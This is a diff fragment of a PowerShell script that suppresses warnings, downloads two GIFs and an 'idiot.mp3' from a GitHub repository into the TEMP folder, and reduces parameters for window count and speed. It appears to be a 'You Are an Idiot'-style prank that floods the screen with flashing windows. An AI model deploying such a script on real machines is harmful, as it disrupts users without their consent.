@@ -4,11 +4,11 @@ $WarningPreference = 'SilentlyContinue'
 $GifUrl1 = "https://raw.githubusercontent.com/Aas6d54asd/XD/refs/heads/main/white2.gif"
 $GifUrl2 = "https://raw.githubusercontent.com/Aas6d54asd/XD/refs/heads/main/black2.gif"
 
-$PocetOken = 70
+$PocetOken = 45
 $Sirka = 352
 $Vyska = 264
 $PrepinaniInterval = 1
-$BaseRychlost = 50
+$BaseRychlost = 25
 
 $MusicUrl = "https://github.com/Aas6d54asd/XD/raw/refs/heads/main/idiot.mp3"
 $tmp = "$env:TEMP\song.mp3"
